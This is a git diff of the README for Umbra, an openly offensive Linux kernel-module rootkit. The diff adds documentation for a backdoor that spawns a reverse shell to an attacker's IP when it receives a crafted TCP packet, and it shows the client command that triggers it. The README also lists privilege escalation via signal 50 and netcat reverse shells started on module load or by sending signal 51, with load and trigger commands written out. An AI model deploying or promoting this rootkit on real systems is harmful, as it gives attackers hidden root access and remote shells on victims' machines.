@@ -1,19 +1,22 @@
 ![GitHub release (latest by date including pre-releases)](https://img.shields.io/github/v/release/h3xduck/Umbra?include_prereleases)
-![Maintainability](https://img.shields.io/static/v1?label=maintainability&message=C&color=green)
+![Maintainability](https://img.shields.io/static/v1?label=maintainability&message=B&color=green)
 ![GitHub code size in bytes](https://img.shields.io/github/languages/code-size/h3xduck/Umbra)
 ![GitHub last commit](https://img.shields.io/github/last-commit/h3xduck/Umbra)
 
 # Umbra
 
-Umbra (/ˈʌmbrə/) is an experimental LKM rootkit for kernels 4.x and 5.x (up to 5.7) which can be used to spawn netcat reverse shells to remote hosts and more.
+Umbra (/ˈʌmbrə/) is an experimental LKM rootkit for kernels 4.x and 5.x (up to 5.7) which opens a network backdoor that spawns reverse shells to remote hosts and more.
 
 The rootkit is still under development, although the features listed below are already fully operational.
+
+![Backdoor in action](https://github.com/h3xduck/Umbra/blob/magic_packets/images/umbrabackdoor.gif)
 
 Note: This rootkit has been developed and tested using kernel 5.4.0 and Ubuntu 18.04.
 
 ## Features
-* Privilege escalation by sending signal 50
-* Start netcat reverse shell on module load.
+* **NEW**: Backdoor which spawns reverse shell to remote IP after receiving a malicious TCP packet.
+* Privilege escalation by sending signal 50.
+* Spawn netcat reverse shell on module load.
 * Spawn netcat reverse shell to a remote host by sending signal 51.
 
 More functionalities will come in later updates.
@@ -42,7 +45,7 @@ cd Umbra
 ```
 make
 ```
-1. Load Umbra in the kernel
+5. Load Umbra in the kernel
 ```
 sudo insmod ./umbra.ko
 ```
@@ -73,6 +76,23 @@ kill -51 1
 <img src="images/kill51screenshot.png" width = 800/>
 
 Note: Umbra also tries to start the reverse shell on load.
+
+### **NEW**: Spawn reverse shell via backdoor
+Any host can get a reverse shell by sending a specially-crafted packet to a machine infected with Umbra. The backdoor will try to open the shell on IP:5888, where IP is the IP address of the attacking machine.
+
+You can look at the code to know how to build your own packet, but I also provide a client which will do the job for you. You can download the client from [latest releases](https://github.com/h3xduck/Umbra/releases/), or you can build your own using my library [RawTCP](https://github.com/h3xduck/RawTCP_Lib).
+
+The client is run as follows:
+
+```
+./client <attacker_ip> <victim_ip>
+```
+Where the attacker ip will be used by the backdoor to connect the reverse shell and the victim ip is the one of the machine infected with Umbra.
+
+
+
+
+
 
 
 ## References
